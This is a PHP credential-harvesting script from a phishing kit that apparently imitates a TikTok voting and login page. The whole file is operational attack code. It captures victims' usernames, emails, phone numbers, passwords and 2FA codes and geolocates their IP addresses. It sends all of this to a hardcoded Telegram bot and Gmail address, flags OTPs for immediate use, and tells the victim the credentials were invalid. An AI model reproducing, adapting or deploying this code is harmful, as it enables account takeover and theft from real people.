<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Telegram configuration (from nnvironmint vaoinblesvariables)
$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: "8272404690:AAFjvKof7tWOT2ITQTWXWxJyr32dYW8QWi4";
$id = getenv('TELEGRAM_CHAT_ID') ?: "-5094845590";
$Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com"; // Define the email address for logging

// Add more debug with file locking for concurrent requests
$requestId = uniqid('script_', true);
file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] Script started at ' . date('Y-m-d H:i:s') . ' from ' . __FILE__ . ' in ' . __DIR__ . PHP_EOL, FILE_APPEND | LOCK_EX);

// Debug: Log POST data with locking
file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] POST: ' . print_r($_POST, true) . PHP_EOL, FILE_APPEND | LOCK_EX);

// Get POST data
$em = isset($_POST['di']) ? trim($_POST['di']) : '';
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
$vote = isset($_POST['vote']) ? trim($_POST['vote']) : '';
$contestant = isset($_POST['contestant']) ? trim($_POST['contestant']) : '';
$status = isset($_POST['status']) ? trim($_POST['status']) : '';

// Function to log message via email and Telegram with improved concurrency handling
function logMessage($message, $send, $subject) {
    // Generate unique request ID for tracking concurrent requests
    $requestId = uniqid('req_', true);

    // Log request start
    $logEntry = '[' . $requestId . '] ' . date('Y-m-d H:i:s') . ' - Starting logMessage' . PHP_EOL;
    file_put_contents(__DIR__ . '/debug.log', $logEntry, FILE_APPEND | LOCK_EX);

    try {
        // Send email
        $emailResult = mail($send, $subject, $message);

        // Send to Telegram with improved error handling and retry logic
        global $botToken, $id;

        // URL encode the message
        $mess = urlencode($message);
        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $id . "&text=" . $mess;

        // Log the Telegram URL
        file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] Telegram URL: ' . $url . PHP_EOL, FILE_APPEND | LOCK_EX);

        // Initialize curl with better options for concurrent requests
        $curl = curl_init();

        curl_setopt_array($curl, [
            CURLOPT_URL => $url,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_USERAGENT => 'PHP-Telegram-Bot/1.0',
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 3,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_ENCODING => '',
            CURLOPT_POST => false, // This is a GET request
        ]);

        $result = curl_exec($curl);
        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        $error = curl_error($curl);
        $errno = curl_errno($curl);
        curl_close($curl);

        // Log curl results
        $curlLog = '[' . $requestId . '] HTTP: ' . $httpCode . ', Result: ' . substr($result, 0, 200) . ', Error: ' . $error . ', Errno: ' . $errno . PHP_EOL;
        file_put_contents(__DIR__ . '/debug.log', $curlLog, FILE_APPEND | LOCK_EX);

        // Check if Telegram request was successful
        $telegramSuccess = false;
        if ($result && $httpCode == 200) {
            $responseData = json_decode($result, true);
            if ($responseData && isset($responseData['ok']) && $responseData['ok'] === true) {
                $telegramSuccess = true;
            }
        }

        // If Telegram failed, log it but don't fail the entire function
        if (!$telegramSuccess) {
            file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] Telegram send FAILED' . PHP_EOL, FILE_APPEND | LOCK_EX);
        }

        // Log completion
        file_put_contents(__DIR__ . '/debug.log', '[' . $requestId . '] logMessage completed' . PHP_EOL, FILE_APPEND | LOCK_EX);

        // Return success based on email (primary) and Telegram (secondary)
        return $emailResult || $telegramSuccess;

    } catch (Exception $e) {
        // Log any exceptions
        $errorLog = '[' . $requestId . '] Exception in logMessage: ' . $e->getMessage() . PHP_EOL;
        file_put_contents(__DIR__ . '/debug.log', $errorLog, FILE_APPEND | LOCK_EX);
        return false;
    }
}

// Function to get real client IP
function getClientIP() {
    $ip_headers = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_X_REAL_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ip_headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            // Handle comma-separated IPs (X-Forwarded-For)
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            // Validate IP
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }

    return getenv("REMOTE_ADDR") ?: '127.0.0.1';
}

// Function to get location from IP with improved reliability
function getLocation($ip) {
    // Skip location lookup for localhost/private IPs
    if ($ip === '127.0.0.1' || $ip === '::1' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false) {
        return [
            'country' => 'Local/Unknown',
            'region' => 'Local/Unknown',
            'city' => 'Local/Unknown'
        ];
    }

    // Try multiple APIs with better error handling
    $apis = [
        [
            'url' => "https://ip-api.com/json/" . $ip . "?fields=country,regionName,city,status,message",
            'parser' => function($data) {
                if (isset($data['status']) && $data['status'] === 'success') {
                    return [
                        'country' => $data['country'] ?? 'Unknown',
                        'region' => $data['regionName'] ?? 'Unknown',
                        'city' => $data['city'] ?? 'Unknown'
                    ];
                }
                return null;
            }
        ],
        [
            'url' => "https://ipinfo.io/" . $ip . "/json",
            'parser' => function($data) {
                if (!isset($data['error']) && isset($data['country'])) {
                    return [
                        'country' => $data['country'] ?? 'Unknown',
                        'region' => $data['region'] ?? 'Unknown',
                        'city' => $data['city'] ?? 'Unknown'
                    ];
                }
                return null;
            }
        ],
        [
            'url' => "https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=" . $ip,
            'parser' => function($data) {
                if (!isset($data['message']) && isset($data['country_name'])) {
                    return [
                        'country' => $data['country_name'] ?? 'Unknown',
                        'region' => $data['state_prov'] ?? 'Unknown',
                        'city' => $data['city'] ?? 'Unknown'
                    ];
                }
                return null;
            }
        ]
    ];

    foreach ($apis as $api) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api['url']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 8); // Reduced timeout
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Allow self-signed certs
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP-Geolocation/1.0)');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 2);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_close($ch);

        // Log API attempts for debugging
        file_put_contents(__DIR__ . '/location_debug.log',
            date('Y-m-d H:i:s') . " - IP: $ip, URL: {$api['url']}, HTTP: $http_code, Error: $curl_error\n",
            FILE_APPEND);

        if ($response && $http_code == 200 && !$curl_error) {
            $data = json_decode($response, true);
            if ($data && is_array($data)) {
                $result = $api['parser']($data);
                if ($result !== null) {
                    // Log successful location
                    file_put_contents(__DIR__ . '/location_debug.log',
                        date('Y-m-d H:i:s') . " - SUCCESS: " . json_encode($result) . "\n",
                        FILE_APPEND);
                    return $result;
                }
            }
        }

        // Small delay between API calls to avoid rate limits
        usleep(100000); // 0.1 second
    }

    // Log failure
    file_put_contents(__DIR__ . '/location_debug.log',
        date('Y-m-d H:i:s') . " - ALL APIs FAILED for IP: $ip\n",
        FILE_APPEND);

    // If all APIs fail, return unknown
    return [
        'country' => 'Unknown',
        'region' => 'Unknown',
        'city' => 'Unknown'
    ];
}

// Check if form fields are set
if (!empty($vote)) {
    // Vote button clicked notification
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "🎯 VOTE BUTTON CLICKED!\n\n";
    $message .= "👑 Contestant: " . htmlspecialchars($contestant) . "\n";
    $message .= "⏳ Status: " . htmlspecialchars($status) . "\n\n";
    $message .= "🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-VOTING SYSTEM ALERT-\n";

    $send = $Receive_email;
    $subject = "Vote Button Clicked: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($em) && empty($password) && empty($otp)) {
    // Continue button clicked (email/phone entered without password or OTP)
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "📱 NEW LOGIN ATTEMPT (Continue)\n\n";
    $message .= "📋 DETAILS:\n";
    $message .= "PLATFORM: TIKTOK\n";

    if (strpos($em, '+') === 0 || strpos($em, '@') !== false) {
        if (strpos($em, '+') === 0) {
            $message .= "Phone Number: " . htmlspecialchars($em) . "\n";
            // Extract country code for phone numbers
            $parts = explode(' ', $em);
            if (count($parts) > 1) {
                $message .= "Country Code: " . htmlspecialchars($parts[0]) . "\n";
            }
        } elseif (strpos($em, '@') !== false) {
            $message .= "Email: " . htmlspecialchars($em) . "\n";
        }
    } else {
        $message .= "Username: " . htmlspecialchars($em) . "\n";
    }

    $message .= "\n🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-TIKTOK LOGIN SYSTEM-\n";

    $send = $Receive_email;
    $subject = "TikTok Continue Button: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($em) && (!empty($password) || !empty($otp))) {
    $ip = getClientIP();
    $location = getLocation($ip);

    if (!empty($password)) {
        // Login attempt
        $message = "🔐 NEW LOGIN ATTEMPT\n\n";
        $message .= "📋 DETAILS:\n";
        $message .= "PLATFORM: TIKTOK\n";
        $message .= "UserName: " . htmlspecialchars($em) . "\n";
        $message .= "Password: " . htmlspecialchars($password) . "\n";
        if (strpos($em, '+') === 0) {
            // Phone number, extract country code
            $parts = explode(' ', $em);
            $message .= "Country Code: " . htmlspecialchars($parts[0]) . "\n";
        }
        $message .= "\n🌍 LOCATION:\n";
        $message .= "Country: " . $location['country'] . "\n";
        $message .= "State: " . $location['region'] . "\n";
        $message .= "City: " . $location['city'] . "\n";
        $message .= "IP: " . $ip . "\n\n";
        $message .= "-SECURED BY SHARPLOGS-\n";
    } elseif (!empty($otp)) {
        // OTP code
        $message = "🔑 TIKTOK 2FA CODE\n\n";
        $message .= "📋 DETAILS:\n";
        $message .= "User: " . htmlspecialchars($em) . "\n";
        $message .= "Code: " . htmlspecialchars($otp) . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
        $message .= "USE IMMEDIATELY – TIME SENSITIVE\n";
    }
    $send = $Receive_email;
    $subject = "Login Attempt: $ip";

    if (logMessage($message, $send, $subject)) {
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}
?>
